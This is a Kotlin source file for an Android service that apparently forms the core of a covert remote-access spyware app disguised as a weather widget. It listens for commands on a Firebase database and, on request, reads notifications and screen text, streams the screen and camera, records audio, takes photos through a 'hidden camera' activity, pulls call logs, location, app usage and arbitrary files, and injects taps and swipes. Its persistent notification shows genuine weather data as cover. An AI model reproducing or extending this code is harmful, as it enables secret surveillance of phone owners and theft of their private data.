package com.jonas.x24.services

import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationManager
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.util.Log
import android.media.AudioManager
import android.media.RingtoneManager
import android.app.usage.UsageStatsManager
import androidx.core.content.ContextCompat
import androidx.core.app.NotificationCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import android.util.Base64
import android.graphics.BitmapFactory
import android.graphics.Bitmap
import java.io.ByteArrayOutputStream

import com.jonas.x24.AudioRecordManager
import com.jonas.x24.services.x24AccessibilityService
import com.jonas.x24.services.x24NotificationService

class FirebaseCommandService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private var weatherUpdateJob: Job? = null
    private var autoLocationJob: Job? = null
    private var liveScreenJob: Job? = null
    private val WEATHER_UPDATE_INTERVAL = 30 * 60 * 1000L // 30 mins

    private lateinit var database: DatabaseReference
    private var sessionKey: String? = null
    private var deviceId: String? = null
    private var listener: ValueEventListener? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        var key = intent?.getStringExtra("SESSION_KEY")
        val prefs = getSharedPreferences("x24_prefs", Context.MODE_PRIVATE)

        if (key == null) {
            key = prefs.getString("SESSION_KEY", null)
        }

        deviceId = prefs.getString("DEVICE_ID", null)
        if (deviceId == null) {
            deviceId = java.util.UUID.randomUUID().toString()
            prefs.edit().putString("DEVICE_ID", deviceId).apply()
        }

        if (key != null && deviceId != null) {
            sessionKey = key
            setupFirebaseListener(key, deviceId!!)
        }

        startWeatherUpdates()
        startForeground(1001, createNotification())
        return START_STICKY
    }

    private fun setupFirebaseListener(key: String, deviceId: String) {
        val rootRef = FirebaseDatabase.getInstance().reference
        database = rootRef.child("sessions").child(key).child("devices").child(deviceId)

        // Device Info
        database.child("info").child("name").setValue(Build.MODEL)
        database.child("info").child("manufacturer").setValue(Build.MANUFACTURER)

        // Presence System
        val connectedRef = FirebaseDatabase.getInstance().getReference(".info/connected")
        val stateRef = database.child("state")

        connectedRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val connected = snapshot.getValue(Boolean::class.java) ?: false
                if (connected) {
                    val onlineRef = stateRef.child("isOnline")
                    val lastSeenRef = stateRef.child("lastSeen")
                    onlineRef.onDisconnect().setValue(false)
                    lastSeenRef.onDisconnect().setValue(com.google.firebase.database.ServerValue.TIMESTAMP)
                    onlineRef.setValue(true)
                }
            }
            override fun onCancelled(error: DatabaseError) {
                Log.w("FirebaseService", "Listener was cancelled")
            }
        })

        listener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val commandsSnapshot = snapshot.child("commands")
                val lastCommandNode = commandsSnapshot.children.lastOrNull()

                if (lastCommandNode != null) {
                    val commandStr = lastCommandNode.child("command").value as? String
                    val processed = lastCommandNode.child("processed").value as? Boolean ?: false

                    if (commandStr != null && !processed) {
                        // Mark as processed immediately so we don't duplicate
                        lastCommandNode.ref.child("processed").setValue(true)
                        processCommand(commandStr)
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e("FirebaseService", "Listener cancelled: ${error.message}")
            }
        }

        database.addValueEventListener(listener!!)
    }

    private fun processCommand(command: String) {
        Log.d("FirebaseService", "Received command: $command")
        val currentSessionKey = sessionKey ?: return

        try {
            when (command) {
                "READ_NOTIFICATIONS" -> readNotifications()
                "READ_SCREEN" -> readScreen()
                "START_LIVE_SCREEN" -> startLiveScreen()
                "STOP_LIVE_SCREEN" -> stopLiveScreen()
                "START_RECORD_AUDIO" -> {
                    AudioRecordManager.startRecording(this, currentSessionKey)
                }
                "STOP_RECORD_AUDIO" -> {
                    AudioRecordManager.stopRecording(this, currentSessionKey)
                }
                "GET_LOCATION" -> getLocation()
                "GET_INSTALLED_APPS" -> getInstalledApps()
                "GET_DEVICE_STATS" -> getDeviceStats()
                "GET_RECENT_CALLS" -> getRecentCalls()
                "PLAY_ALARM" -> playRemoteAlarm()
                "GET_APP_USAGE" -> getAppUsageStats()
                "CAPTURE_PHOTO" -> capturePhoto()
                "GET_DEVICE_INFO" -> getDetailedDeviceInfo()
                "START_LIVE_CAMERA:FRONT" -> sessionKey?.let { com.jonas.x24.CameraStreamManager.startStreaming(this, it, true) }
                "START_LIVE_CAMERA:BACK" -> sessionKey?.let { com.jonas.x24.CameraStreamManager.startStreaming(this, it, false) }
                "STOP_LIVE_CAMERA" -> com.jonas.x24.CameraStreamManager.stopStreaming()
                else -> {
                    if (command == "DISPATCH_GESTURE:BACK") {
                        com.jonas.x24.services.x24AccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
                    } else if (command.startsWith("DISPATCH_GESTURE:CLICK:")) {
                        val coords = command.removePrefix("DISPATCH_GESTURE:CLICK:").split(":")
                        if (coords.size == 2) {
                            val xPercent = coords[0].toFloatOrNull()
                            val yPercent = coords[1].toFloatOrNull()
                            if (xPercent != null && yPercent != null) {
                                com.jonas.x24.services.x24AccessibilityService.instance?.clickPercentage(xPercent, yPercent)
                            }
                        }
                    } else if (command.startsWith("DISPATCH_GESTURE:SWIPE:")) {
                        val coords = command.removePrefix("DISPATCH_GESTURE:SWIPE:").split(":")
                        if (coords.size == 4) {
                            val startXPercent = coords[0].toFloatOrNull()
                            val startYPercent = coords[1].toFloatOrNull()
                            val endXPercent = coords[2].toFloatOrNull()
                            val endYPercent = coords[3].toFloatOrNull()
                            if (startXPercent != null && startYPercent != null && endXPercent != null && endYPercent != null) {
                                com.jonas.x24.services.x24AccessibilityService.instance?.swipePercentage(startXPercent, startYPercent, endXPercent, endYPercent)
                            }
                        }
                    } else if (command.startsWith("LAUNCH_APP:")) {
                        val pkgName = command.removePrefix("LAUNCH_APP:").trim()
                        launchApp(pkgName)
                    } else if (command.startsWith("LIST_FILES:")) {
                        val path = command.removePrefix("LIST_FILES:").trim()
                        listFiles(path)
                    } else if (command.startsWith("FETCH_PIC:")) {
                        val path = command.removePrefix("FETCH_PIC:").trim()
                        fetchPic(path)
                    } else if (command.startsWith("FETCH_FILE:")) {
                        val path = command.removePrefix("FETCH_FILE:").trim()
                        fetchFile(path)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("FirebaseService", "Command crashed: ${e.message}", e)
            postResult("ERROR", "Command crashed: ${e.message}", command)
        }
    }

    private fun listFiles(path: String) {
        try {
            val dir = java.io.File(path)
            if (!dir.exists() || !dir.isDirectory) {
                postResult("ERROR", "Directory does not exist or is not a directory: $path")
                return
            }

            val files = dir.listFiles() ?: arrayOf()
            val fileList = mutableListOf<Map<String, Any>>()

            for (file in files) {
                val name = file.name
                val isDir = file.isDirectory
                val size = if (isDir) 0 else file.length()

                val type = if (isDir) {
                    "FOLDER"
                } else if (name.endsWith(".jpg", true) || name.endsWith(".jpeg", true) || name.endsWith(".png", true) || name.endsWith(".webp", true)) {
                    "PICTURE"
                } else if (name.endsWith(".mp4", true) || name.endsWith(".mkv", true) || name.endsWith(".webm", true)) {
                    "VIDEO"
                } else {
                    "OTHER"
                }

                fileList.add(mapOf(
                    "name" to name,
                    "path" to file.absolutePath,
                    "isDir" to isDir,
                    "size" to size,
                    "type" to type
                ))
            }

            val resultJson = com.google.gson.Gson().toJson(mapOf(
                "currentPath" to path,
                "files" to fileList
            ))

            postResult("FILE_LIST", resultJson)
        } catch (e: Exception) {
            postResult("ERROR", "Failed to list files: ${e.message}")
        }
    }

    private fun fetchPic(path: String) {
        try {
            val file = java.io.File(path)
            if (!file.exists() || !file.isFile) {
                postResult("ERROR", "File does not exist: $path")
                return
            }

            val options = BitmapFactory.Options()
            options.inJustDecodeBounds = true
            BitmapFactory.decodeFile(file.absolutePath, options)

            var scale = 1
            while (options.outWidth / scale / 2 >= 1024 && options.outHeight / scale / 2 >= 1024) {
                scale *= 2
            }

            val decodeOptions = BitmapFactory.Options()
            decodeOptions.inSampleSize = scale
            val bitmap = BitmapFactory.decodeFile(file.absolutePath, decodeOptions)

            if (bitmap != null) {
                val baos = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos)
                val imageBytes = baos.toByteArray()
                val base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
                postResult("IMAGE", base64Image)
                bitmap.recycle()
            } else {
                postResult("ERROR", "Failed to decode image file.")
            }
        } catch (e: Exception) {
            postResult("ERROR", "Failed to fetch picture: ${e.message}")
        }
    }

    private fun fetchFile(path: String) {
        try {
            val file = java.io.File(path)
            if (!file.exists() || !file.isFile) {
                postResult("ERROR", "File does not exist: $path")
                return
            }

            if (file.length() > 2 * 1024 * 1024) { // 2MB limit
                postResult("ERROR", "File is too large to fetch directly (limit 2MB). Size: ${file.length() / (1024 * 1024)} MB")
                return
            }

            val bytes = file.readBytes()
            val base64File = Base64.encodeToString(bytes, Base64.NO_WRAP)
            postResult("FILE", "${file.name}|$base64File")

        } catch (e: Exception) {
            postResult("ERROR", "Failed to fetch file: ${e.message}")
        }
    }

    private fun launchApp(packageName: String) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                postResult("TEXT", "Successfully launched app: $packageName")
            } else {
                postResult("ERROR", "App not found or cannot be launched: $packageName")
            }
        } catch (e: Exception) {
            postResult("ERROR", "Failed to launch app: ${e.message}")
        }
    }

    private fun getDetailedDeviceInfo() {
        try {
            val sb = java.lang.StringBuilder()
            sb.append("--- Detailed Device Info ---\n")
            sb.append("Model: ${Build.MANUFACTURER} ${Build.MODEL}\n")
            sb.append("OS Version: Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n\n")

            // Battery
            val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            if (batteryStatus != null) {
                val level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                val status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
                if (level != -1 && scale != -1) {
                    val batteryPct = level * 100 / scale.toFloat()
                    sb.append("Battery: ${batteryPct.toInt()}% (${if (isCharging) "Charging" else "Discharging"})\n")
                }
            }

            // Storage
            val internalStat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
            val availableSpaceMB = internalStat.availableBlocksLong * internalStat.blockSizeLong / (1024 * 1024)
            val totalSpaceMB = internalStat.blockCountLong * internalStat.blockSizeLong / (1024 * 1024)
            sb.append("Internal Storage: ${availableSpaceMB}MB free of ${totalSpaceMB}MB\n")

            // Network
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            if (capabilities != null) {
                if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                    sb.append("Network: Connected to Wi-Fi\n")
                } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                    sb.append("Network: Connected to Cellular\n")
                } else {
                    sb.append("Network: Connected (Other)\n")
                }
            } else {
                sb.append("Network: Disconnected\n")
            }

            postResult("TEXT", sb.toString())
        } catch (e: Exception) {
            postResult("ERROR", "Failed to fetch detailed info: ${e.message}")
        }
    }

    private fun getLocation() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            postResult("ERROR", "Location permissions denied")
            return
        }

        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var location: Location? = null
        try {
            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
        } catch(e: Exception) {
            Log.e("FirebaseService", "Location error", e)
        }

        if (location != null) {
            val geocoder = Geocoder(this, java.util.Locale.getDefault())
            try {
                val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                if (!addresses.isNullOrEmpty()) {
                    val address = addresses[0]
                    val locStr = "${address.locality ?: "Unknown City"}, ${address.adminArea ?: ""}"
                    postResult("TEXT", "Location: $locStr\nCoords: ${location.latitude}, ${location.longitude}")
                    return
                }
            } catch (e: Exception) { }
            postResult("TEXT", "Coords: ${location.latitude}, ${location.longitude}")
        } else {
            postResult("ERROR", "Could not determine location")
        }
    }

    private fun readScreen() {
        val service = x24AccessibilityService.instance
        if (service != null) {
            val screenContext = service.getScreenContext()
            postResult("TEXT", "Screen Context:\n$screenContext")
        } else {
            postResult("ERROR", "Accessibility service not running")
        }
    }

    private fun startLiveScreen() {
        if (liveScreenJob?.isActive == true) return
        liveScreenJob = serviceScope.launch {
            while (true) {
                readScreen()
                delay(1000) // Poll every 1 second
            }
        }
        postResult("TEXT", "Live Screen Stream Started")
    }

    private fun stopLiveScreen() {
        liveScreenJob?.cancel()
        postResult("TEXT", "Live Screen Stream Stopped")
    }

    private fun getInstalledApps() {
        val pm = packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val sb = java.lang.StringBuilder()
        for (appInfo in packages) {
            if (pm.getLaunchIntentForPackage(appInfo.packageName) != null) {
                val appName = pm.getApplicationLabel(appInfo).toString()
                sb.append("$appName (${appInfo.packageName})\n")
            }
        }
        postResult("TEXT", sb.toString().trim(), "GET_INSTALLED_APPS")
    }

    private var mediaPlayer: android.media.MediaPlayer? = null

    private fun playRemoteAlarm() {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audioManager.setStreamVolume(
                AudioManager.STREAM_ALARM,
                audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM),
                0
            )

            if (mediaPlayer?.isPlaying == true) {
                mediaPlayer?.stop()
                mediaPlayer?.release()
                mediaPlayer = null
                postResult("TEXT", "Alarm stopped.", "PLAY_ALARM")
                return
            }

            var alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
            if (alarmUri == null) {
                alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
            }

            mediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(applicationContext, alarmUri)
                setAudioAttributes(
                    android.media.AudioAttributes.Builder()
                        .setUsage(android.media.AudioAttributes.USAGE_ALARM)
                        .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build()
                )
                isLooping = true
                prepare()
                start()
            }
            postResult("TEXT", "Playing remote alarm. Send command again to stop.", "PLAY_ALARM")
        } catch (e: Exception) {
            postResult("ERROR", "Failed to play alarm: ${e.message}", "PLAY_ALARM")
        }
    }

    private fun capturePhoto() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            postResult("ERROR", "CAMERA permission not granted", "CAPTURE_PHOTO")
            return
        }

        postResult("TEXT", "Launching hidden camera to capture photo...", "CAPTURE_PHOTO")

        val intent = Intent(this, com.jonas.x24.HiddenCameraActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra("SESSION_KEY", sessionKey)
        }
        startActivity(intent)
    }

    private fun getAppUsageStats() {
        val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val endTime = System.currentTimeMillis()
        val startTime = endTime - 1000 * 60 * 60 * 24 // 24 hours ago
        val usageStatsList = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, startTime, endTime)

        if (usageStatsList == null || usageStatsList.isEmpty()) {
            postResult("TEXT", "No app usage stats available. Usage Access permission may not be granted.", "GET_APP_USAGE")
            return
        }

        val sortedStats = usageStatsList.sortedByDescending { it.totalTimeInForeground }
        val sb = java.lang.StringBuilder()
        sb.append("App Usage (Last 24 Hours):\n\n")

        val pm = packageManager
        for (usageStats in sortedStats) {
            val totalTime = usageStats.totalTimeInForeground
            if (totalTime > 1000 * 60) { // Only show apps used for more than 1 minute
                val pkgName = usageStats.packageName
                val appName = try {
                    pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString()
                } catch (e: PackageManager.NameNotFoundException) {
                    pkgName
                }
                val minutes = totalTime / (1000 * 60) % 60
                val hours = totalTime / (1000 * 60 * 60)
                sb.append("$appName ($pkgName): ")
                if (hours > 0) sb.append("${hours}h ")
                sb.append("${minutes}m\n")
            }
        }

        if (sb.length < 50) {
            sb.append("No apps used for more than 1 minute in the last 24 hours.")
        }
        postResult("TEXT", sb.toString().trim(), "GET_APP_USAGE")
    }

    private fun getDeviceStats() {
        val sb = StringBuilder()

        // Device Info
        sb.append("Device: ${Build.MANUFACTURER} ${Build.MODEL}\n")
        sb.append("OS Version: Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n\n")

        // Uptime
        val uptimeMillis = android.os.SystemClock.elapsedRealtime()
        val uptimeHours = uptimeMillis / (1000 * 60 * 60)
        val uptimeMins = (uptimeMillis / (1000 * 60)) % 60
        sb.append("System Uptime: ${uptimeHours}h ${uptimeMins}m\n")

        // Battery Status
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { ifilter ->
            registerReceiver(null, ifilter)
        }
        val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = level * 100 / scale.toFloat()
        val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging: Boolean = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        sb.append("Battery: ${batteryPct.toInt()}% " + (if (isCharging) "(Charging)\n" else "(Not Charging)\n"))

        // RAM Status
        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memoryInfo = android.app.ActivityManager.MemoryInfo()
        activityManager.getMemoryInfo(memoryInfo)
        val availableRamGb = memoryInfo.availMem.toDouble() / (1024 * 1024 * 1024)
        val totalRamGb = memoryInfo.totalMem.toDouble() / (1024 * 1024 * 1024)
        sb.append(String.format(java.util.Locale.US, "RAM: %.2f GB / %.2f GB\n", availableRamGb, totalRamGb))

        // Storage Status
        try {
            val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
            val blockSize = stat.blockSizeLong
            val totalBlocks = stat.blockCountLong
            val availableBlocks = stat.availableBlocksLong
            val totalSpaceGb = (totalBlocks * blockSize).toDouble() / (1024 * 1024 * 1024)
            val availableSpaceGb = (availableBlocks * blockSize).toDouble() / (1024 * 1024 * 1024)
            sb.append(String.format(java.util.Locale.US, "Internal Storage: %.2f GB / %.2f GB\n", availableSpaceGb, totalSpaceGb))
        } catch (e: Exception) {
            sb.append("Internal Storage: Unknown\n")
        }

        // Network Status
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork
        val capabilities = cm.getNetworkCapabilities(network)
        if (capabilities != null) {
            if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                sb.append("Network: Connected (Wi-Fi)\n")
            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                sb.append("Network: Connected (Cellular)\n")
            } else {
                sb.append("Network: Connected (Other)\n")
            }
        } else {
            sb.append("Network: Disconnected\n")
        }

        postResult("TEXT", sb.toString().trim(), "GET_DEVICE_STATS")
    }

    private fun getRecentCalls() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            postResult("ERROR", "READ_CALL_LOG permission not granted", "GET_RECENT_CALLS")
            return
        }

        val sb = StringBuilder()
        val projection = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION)
        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 10")

        if (cursor != null && cursor.moveToFirst()) {
            val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
            val dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)

            do {
                val number = if (numberIndex != -1) cursor.getString(numberIndex) ?: "Unknown" else "Unknown"
                val typeCodeStr = if (typeIndex != -1) cursor.getString(typeIndex) else null
                val typeCode = typeCodeStr?.toIntOrNull() ?: -1
                val date = if (dateIndex != -1) cursor.getLong(dateIndex) else 0L
                val duration = if (durationIndex != -1) cursor.getString(durationIndex) ?: "0" else "0"

                val type = when (typeCode) {
                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "Missed"
                    else -> "Other"
                }

                val dateStr = if (date > 0) {
                    java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(date))
                } else {
                    "Unknown Date"
                }
                sb.append("$dateStr | $type | $number | ${duration}s\n")
            } while (cursor.moveToNext())
            cursor.close()
            postResult("TEXT", sb.toString().trim(), "GET_RECENT_CALLS")
        } else {
            cursor?.close()
            postResult("TEXT", "No recent calls found.", "GET_RECENT_CALLS")
        }
    }

    private fun postResult(type: String, data: String, command: String = "") {
        val currentSessionKey = sessionKey ?: return
        val currentDeviceId = deviceId ?: return
        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("devices").child(currentDeviceId).child("results").push()
        val payload = mapOf(
            "type" to type,
            "data" to data,
            "command" to command,
            "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP
        )
        ref.setValue(payload)
    }

    private fun readNotifications() {
        val activeNotifs = x24NotificationService.instance?.getActiveNotificationsList() ?: emptyList()
        val recentNotifs = x24NotificationService.recentNotifications

        val builder = java.lang.StringBuilder()

        if (activeNotifs.isNotEmpty()) {
            builder.append("Active Notifications:\n")
            builder.append(activeNotifs.joinToString("\n"))
            builder.append("\n\n")
        } else {
            builder.append("No active notifications.\n\n")
        }

        if (recentNotifs.isNotEmpty()) {
            builder.append("Recent Notifications:\n")
            builder.append(recentNotifs.joinToString("\n"))
        } else {
            builder.append("No recent notifications.")
        }

        postResult("TEXT", builder.toString().trim())
    }

    private fun createNotification(title: String = "Weather", text: String = "Loading weather data..."): android.app.Notification {
        val channelId = "x24_monitor_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Monitor Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(com.jonas.x24.R.drawable.ic_cloud)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        weatherUpdateJob?.cancel()
        if (listener != null && ::database.isInitialized) {
            database.removeEventListener(listener!!)
        }
    }

    private fun startWeatherUpdates() {
        weatherUpdateJob = serviceScope.launch {
            while (true) {
                updateWeatherNotification()
                delay(WEATHER_UPDATE_INTERVAL)
            }
        }
    }

    private fun fetchWeatherAndNotify(lat: Double, lon: Double, city: String) {
        try {
            val retrofit = Retrofit.Builder()
                .baseUrl("https://api.open-meteo.com/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()

            val api = retrofit.create(WeatherApi::class.java)
            val response = api.getCurrentWeather(lat, lon).execute()

            if (response.isSuccessful) {
                val weather = response.body()?.current_weather
                if (weather != null) {
                    val temp = weather.temperature
                    val title = "$city"
                    val text = "Temperature: $temp°C"

                    val notification = createNotification(title, text)
                    val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                    notificationManager.notify(1001, notification)
                    return
                }
            }
        } catch (e: Exception) {
            Log.e("x24", "Failed to fetch weather: ${e.message}")
        }
        fallbackNotification()
    }

    private fun getIpBasedLocationAndWeather() {
        try {
            val retrofit = Retrofit.Builder()
                .baseUrl("https://ipwho.is/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()

            val api = retrofit.create(IpWhoisApi::class.java)
            val response = api.getLocationInfo().execute()

            if (response.isSuccessful) {
                val ipInfo = response.body()
                if (ipInfo != null && ipInfo.success && ipInfo.latitude != null && ipInfo.longitude != null) {
                    val city = ipInfo.city ?: "Unknown City"
                    fetchWeatherAndNotify(ipInfo.latitude, ipInfo.longitude, city)
                    return
                }
            }
        } catch (e: Exception) {
            Log.e("x24", "Failed to get IP based location: ${e.message}")
        }
        fallbackNotification()
    }

    private fun fallbackNotification() {
        val notification = createNotification("Weather", "Checking for updates...")
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(1001, notification)
    }

    private fun updateWeatherNotification() {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var location: Location? = null

            val hasLocationPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

            if (hasLocationPermission) {
                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (location == null) {
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                }
            }

            if (location != null) {
                val geocoder = Geocoder(this, java.util.Locale.getDefault())
                val addresses = try {
                    geocoder.getFromLocation(location.latitude, location.longitude, 1)
                } catch (e: Exception) { null }
                val city = addresses?.firstOrNull()?.locality ?: "Unknown City"
                fetchWeatherAndNotify(location.latitude, location.longitude, city)
                return
            }

            if (hasLocationPermission) {
                var freshLocation: Location? = null
                val latch = java.util.concurrent.CountDownLatch(1)

                try {
                    androidx.core.location.LocationManagerCompat.getCurrentLocation(
                        locationManager,
                        LocationManager.GPS_PROVIDER,
                        androidx.core.os.CancellationSignal(),
                        androidx.core.content.ContextCompat.getMainExecutor(this)
                    ) { loc ->
                        if (loc != null) {
                            freshLocation = loc
                        } else {
                            try {
                                androidx.core.location.LocationManagerCompat.getCurrentLocation(
                                    locationManager,
                                    LocationManager.NETWORK_PROVIDER,
                                    androidx.core.os.CancellationSignal(),
                                    androidx.core.content.ContextCompat.getMainExecutor(this)
                                ) { locNet ->
                                    freshLocation = locNet
                                    latch.countDown()
                                }
                            } catch (e: Exception) { latch.countDown() }
                        }
                        if (loc != null) latch.countDown()
                    }
                    latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
                } catch (e: Exception) {
                    Log.e("x24", "Failed to get fresh location: ${e.message}")
                }

                if (freshLocation != null) {
                    val geocoder = Geocoder(this, java.util.Locale.getDefault())
                    val addresses = try {
                        geocoder.getFromLocation(freshLocation!!.latitude, freshLocation!!.longitude, 1)
                    } catch (e: Exception) { null }
                    val city = addresses?.firstOrNull()?.locality ?: "Unknown City"
                    fetchWeatherAndNotify(freshLocation!!.latitude, freshLocation!!.longitude, city)
                    return
                }
            }

            // Fallback to IP-based location
            getIpBasedLocationAndWeather()

        } catch (e: Exception) {
            Log.e("x24", "Failed to update weather: ${e.message}")
            fallbackNotification()
        }
    }
}